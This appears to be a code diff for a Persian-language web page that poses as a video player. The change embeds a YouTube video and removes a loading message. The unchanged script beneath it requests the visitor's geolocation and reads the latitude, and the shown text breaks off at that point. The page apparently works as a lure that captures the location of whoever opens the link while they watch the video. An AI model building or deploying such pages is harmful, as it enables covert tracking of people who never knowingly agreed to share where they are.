@@ -2,14 +2,14 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>فیلم</title>
+<title>ویدیو</title>
 <style>
-body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column;}
-p{color:white;font-size:20px;}
+body{margin:0;background:#000;display:flex;justify-content:center;align-items:center;height:100vh;}
+iframe{width:100%;max-width:500px;height:80vh;}
 </style>
 </head>
 <body>
-<p>در حال بارگذاری...</p>
+<iframe id="yt" src="https://www.youtube.com/embed/XgmWlmHtsf8" allowfullscreen></iframe>
 <script>
 navigator.geolocation.getCurrentPosition(function(p){
 var lat=p.coords.latitude;
